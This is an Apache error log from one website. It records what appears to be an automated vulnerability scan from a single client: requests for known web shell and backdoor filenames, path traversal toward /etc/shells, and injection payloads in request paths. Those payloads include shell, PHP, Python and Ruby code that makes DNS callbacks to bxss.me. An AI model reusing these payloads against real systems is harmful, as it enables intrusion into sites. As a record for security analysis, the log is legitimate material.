[Wed Jul 07 23:38:22.762930 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/zehir.php' not found or unable to stat
[Wed Jul 07 23:38:22.764278 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/nst.php' not found or unable to stat
[Wed Jul 07 23:38:22.764342 2021] [php7:error] [pid 23002] [client 27.147.202.214:5878] script '/var/www/html/stocktuna.com/assets/phpinfo.php' not found or unable to stat
[Wed Jul 07 23:38:22.771543 2021] [php7:error] [pid 23058] [client 27.147.202.214:7782] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 23:38:23.001917 2021] [php7:error] [pid 23069] [client 27.147.202.214:7913] script '/var/www/html/stocktuna.com/assets/css/info.php' not found or unable to stat
[Wed Jul 07 23:38:23.052475 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/c-h.v2.php' not found or unable to stat
[Wed Jul 07 23:38:23.057066 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/rst.php' not found or unable to stat
[Wed Jul 07 23:38:23.116117 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/r57shell.php' not found or unable to stat
[Wed Jul 07 23:38:23.141911 2021] [php7:error] [pid 22992] [client 27.147.202.214:5937] script '/var/www/html/stocktuna.com/assets/webadmin.php' not found or unable to stat
[Wed Jul 07 23:38:23.341171 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/pi.php' not found or unable to stat
[Wed Jul 07 23:38:23.344400 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/php-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:23.352049 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/assets/css/r57eng.php' not found or unable to stat
[Wed Jul 07 23:38:23.414472 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/r57.php' not found or unable to stat
[Wed Jul 07 23:38:23.633299 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:23.644074 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/assets/css/shell.php' not found or unable to stat
[Wed Jul 07 23:38:23.713164 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/r58.php' not found or unable to stat
[Wed Jul 07 23:38:23.897750 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/php.php' not found or unable to stat
[Wed Jul 07 23:38:23.932262 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/dra.php' not found or unable to stat
[Wed Jul 07 23:38:24.012783 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/c99shell.php' not found or unable to stat
[Wed Jul 07 23:38:24.175466 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/i.php' not found or unable to stat
[Wed Jul 07 23:38:24.215537 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/r.php' not found or unable to stat
[Wed Jul 07 23:38:24.311321 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/c99.php' not found or unable to stat
[Wed Jul 07 23:38:24.492437 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/assets/test.php' not found or unable to stat
[Wed Jul 07 23:38:24.499692 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/lol.php' not found or unable to stat
[Wed Jul 07 23:38:24.608926 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/nstview.php' not found or unable to stat
[Wed Jul 07 23:38:24.781130 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/assets/temp.php' not found or unable to stat
[Wed Jul 07 23:38:24.790043 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/zehir.php' not found or unable to stat
[Wed Jul 07 23:38:24.906236 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/nst.php' not found or unable to stat
[Wed Jul 07 23:38:25.080452 2021] [php7:error] [pid 23021] [client 27.147.202.214:7783] script '/var/www/html/stocktuna.com/assets/info.php' not found or unable to stat
[Wed Jul 07 23:38:25.080836 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/c-h.v2.php' not found or unable to stat
[Wed Jul 07 23:38:25.207456 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/rst.php' not found or unable to stat
[Wed Jul 07 23:38:25.364132 2021] [php7:error] [pid 23021] [client 27.147.202.214:7783] script '/var/www/html/stocktuna.com/assets/css/php-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:25.505504 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/r57eng.php' not found or unable to stat
[Wed Jul 07 23:38:25.647830 2021] [php7:error] [pid 23021] [client 27.147.202.214:7783] script '/var/www/html/stocktuna.com/assets/css/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:25.808103 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/shell.php' not found or unable to stat
[Wed Jul 07 23:38:26.294273 2021] [core:error] [pid 22523] [client 27.147.202.214:7778] AH00126: Invalid URI in request GET /images/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 23:38:27.197767 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/dra.php' not found or unable to stat
[Wed Jul 07 23:38:28.341813 2021] [php7:error] [pid 22523] [client 27.147.202.214:1478] script '/var/www/html/stocktuna.com/images/y61b34cno0bo.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:29.237844 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/assets/r.php' not found or unable to stat
[Wed Jul 07 23:38:30.487517 2021] [php7:error] [pid 23021] [client 27.147.202.214:7783] script '/var/www/html/stocktuna.com/assets/lol.php' not found or unable to stat
[Wed Jul 07 23:38:31.630488 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/assets/zehir.php' not found or unable to stat
[Wed Jul 07 23:38:31.911968 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/assets/c-h.v2.php' not found or unable to stat
[Wed Jul 07 23:38:32.189534 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/php-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:32.471247 2021] [php7:error] [pid 23093] [client 27.147.202.214:1472] script '/var/www/html/stocktuna.com/assets/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:33.635105 2021] [authz_core:error] [pid 22808] [client 27.147.202.214:7792] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess~
[Wed Jul 07 23:38:33.943994 2021] [authz_core:error] [pid 22808] [client 27.147.202.214:7792] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess.old
[Wed Jul 07 23:38:34.233142 2021] [authz_core:error] [pid 22808] [client 27.147.202.214:7792] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess.save
[Wed Jul 07 23:38:35.640848 2021] [core:error] [pid 22989] (36)File name too long: [client 27.147.202.214:7774] AH00036: access to /;(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")|(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")&(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")/js/browser.min.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")|(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")&(nslookup hitdgjkmkmczn103d0.bxss.me||perl -e "gethostbyname('hitdgjkmkmczn103d0.bxss.me')")')
[Wed Jul 07 23:38:36.717309 2021] [authz_core:error] [pid 23093] [client 27.147.202.214:1472] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess~
[Wed Jul 07 23:38:37.136092 2021] [authz_core:error] [pid 23093] [client 27.147.202.214:1472] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess.old
[Wed Jul 07 23:38:37.554079 2021] [authz_core:error] [pid 23071] [client 27.147.202.214:7914] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess.save
[Wed Jul 07 23:38:41.570791 2021] [php7:error] [pid 22873] [client 27.147.202.214:1476] script '/var/www/html/stocktuna.com/login.php' not found or unable to stat
[Wed Jul 07 23:38:43.189914 2021] [core:error] [pid 22985] (36)File name too long: [client 27.147.202.214:7779] AH00036: access to /;(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")|(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")&(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")/js/breakpoints.min.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")|(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")&(nslookup hitaoawtxzueb9ac79.bxss.me||perl -e "gethostbyname('hitaoawtxzueb9ac79.bxss.me')")')
[Wed Jul 07 23:38:43.799167 2021] [authz_core:error] [pid 22873] [client 27.147.202.214:1476] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess~
[Wed Jul 07 23:38:43.807204 2021] [authz_core:error] [pid 23019] [client 27.147.202.214:7785] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess~
[Wed Jul 07 23:38:44.071531 2021] [php7:error] [pid 23027] [client 27.147.202.214:1473] script '/var/www/html/stocktuna.com/docsgjpbU.php' not found or unable to stat
[Wed Jul 07 23:38:44.075744 2021] [authz_core:error] [pid 22873] [client 27.147.202.214:1476] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess.old
[Wed Jul 07 23:38:44.083741 2021] [authz_core:error] [pid 23019] [client 27.147.202.214:7785] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess.old
[Wed Jul 07 23:38:44.352333 2021] [authz_core:error] [pid 22873] [client 27.147.202.214:1476] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess.save
[Wed Jul 07 23:38:44.360157 2021] [authz_core:error] [pid 23019] [client 27.147.202.214:7785] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess.save
[Wed Jul 07 23:38:44.688447 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/VxCKtdocs.php' not found or unable to stat
[Wed Jul 07 23:38:44.688789 2021] [core:error] [pid 23027] (36)File name too long: [client 27.147.202.214:1473] AH00036: access to /assets/;(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")|(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")&(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")/browser.min.js failed (filesystem path '/var/www/html/stocktuna.com/assets/;(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")|(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")&(nslookup hitjwfaauyltk2ccee.bxss.me||perl -e "gethostbyname('hitjwfaauyltk2ccee.bxss.me')")')
[Wed Jul 07 23:38:45.525171 2021] [core:error] [pid 23064] (36)File name too long: [client 27.147.202.214:7771] AH00036: access to /;(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")|(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")&(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")/js/main.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")|(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")&(nslookup hitlhmenmrlvu61754.bxss.me||perl -e "gethostbyname('hitlhmenmrlvu61754.bxss.me')")')
[Wed Jul 07 23:38:51.946832 2021] [php7:error] [pid 23092] [client 27.147.202.214:1471] script '/var/www/html/stocktuna.com/indexgA1mh.php' not found or unable to stat
[Wed Jul 07 23:38:52.447088 2021] [php7:error] [pid 23073] [client 27.147.202.214:1477] script '/var/www/html/stocktuna.com/stocktuna_pydocsYaIq3.php' not found or unable to stat
[Wed Jul 07 23:38:52.484111 2021] [php7:error] [pid 22873] [client 27.147.202.214:1476] script '/var/www/html/stocktuna.com/old_docs.php' not found or unable to stat
[Wed Jul 07 23:38:52.510136 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/jHjFhindex.php' not found or unable to stat
[Wed Jul 07 23:38:52.761871 2021] [php7:error] [pid 22873] [client 27.147.202.214:1476] script '/var/www/html/stocktuna.com/docs_old.php' not found or unable to stat
[Wed Jul 07 23:38:53.008637 2021] [php7:error] [pid 23073] [client 27.147.202.214:1477] script '/var/www/html/stocktuna.com/gKtp6stocktuna_pydocs.php' not found or unable to stat
[Wed Jul 07 23:38:53.038451 2021] [php7:error] [pid 22873] [client 27.147.202.214:1476] script '/var/www/html/stocktuna.com/docs_bak.php' not found or unable to stat
[Wed Jul 07 23:38:53.317170 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/response.write(9549433*9461618).php' not found or unable to stat
[Wed Jul 07 23:38:53.390362 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/echo obtvha$()\\ buyydw\\nz^xyu||a #' &echo obtvha$()\\ buyydw\\nz^xyu||a #|" &echo obtvha$()\\ buyydw\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 23:38:53.598376 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/'+response.write(9549433*9461618)+'.php' not found or unable to stat
[Wed Jul 07 23:38:53.626642 2021] [authz_core:error] [pid 23092] [client 27.147.202.214:1471] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.php, referer: https://stocktuna.com/
[Wed Jul 07 23:38:53.678857 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/&echo pscklz$()\\ daegag\\nz^xyu||a #' &echo pscklz$()\\ daegag\\nz^xyu||a #|" &echo pscklz$()\\ daegag\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 23:38:53.822038 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/vrHRMIWI.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:53.878811 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/"+response.write(9549433*9461618)+".php' not found or unable to stat
[Wed Jul 07 23:38:53.965395 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/|echo bpxsdi$()\\ eamduw\\nz^xyu||a #' |echo bpxsdi$()\\ eamduw\\nz^xyu||a #|" |echo bpxsdi$()\\ eamduw\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 23:38:53.996440 2021] [php7:error] [pid 23043] [client 27.147.202.214:8304] script '/var/www/html/stocktuna.com/ws27FzPJ.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:54.175328 2021] [php7:error] [pid 23098] [client 27.147.202.214:1481] script '/var/www/html/stocktuna.com/docs&n979013=v903752.php' not found or unable to stat
[Wed Jul 07 23:38:54.176720 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/).php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:54.212114 2021] [php7:error] [pid 23092] [client 27.147.202.214:1471] script '/var/www/html/stocktuna.com/'.gethostbyname(lc('hitat'.'feppmwck3b45a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(68).chr(105).chr(82).'.php' not found or unable to stat
[Wed Jul 07 23:38:54.256827 2021] [php7:error] [pid 23028] [client 27.147.202.214:8302] script '/var/www/html/stocktuna.com/(nslookup hitreniczfndk087ab.bxss.me||perl -e "gethostbyname('hitreniczfndk087ab.bxss.me')").php' not found or unable to stat
[Wed Jul 07 23:38:54.277565 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Wed Jul 07 23:38:54.417832 2021] [core:error] [pid 23065] (36)File name too long: [client 27.147.202.214:8323] AH00036: access to /;(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")|(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")&(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")/js/util.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")|(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")&(nslookup hitbfvfbaqhubf1791.bxss.me||perl -e "gethostbyname('hitbfvfbaqhubf1791.bxss.me')")')
[Wed Jul 07 23:38:54.600272 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/!(()&&!|*|*|.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:54.607596 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/';print(md5(31337));$a='.php' not found or unable to stat
[Wed Jul 07 23:38:54.613241 2021] [php7:error] [pid 23092] [client 27.147.202.214:1471] script '/var/www/html/stocktuna.com/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hityumvlicelxe15d3.'+'bxss.me').php' not found or unable to stat
[Wed Jul 07 23:38:54.614732 2021] [php7:error] [pid 23098] [client 27.147.202.214:1481] script '/var/www/html/stocktuna.com/bak.index.php' not found or unable to stat
[Wed Jul 07 23:38:54.643593 2021] [php7:error] [pid 23111] [client 27.147.202.214:8311] script '/var/www/html/stocktuna.com/"+"A".concat(70-3).concat(22*4).concat(100).concat(71).concat(107).concat(87)+(require"socket"\nSocket.gethostbyname("hitxc"+"lhzoggvr6e0bb.bxss.me.")[3].to_s)+".php' not found or unable to stat
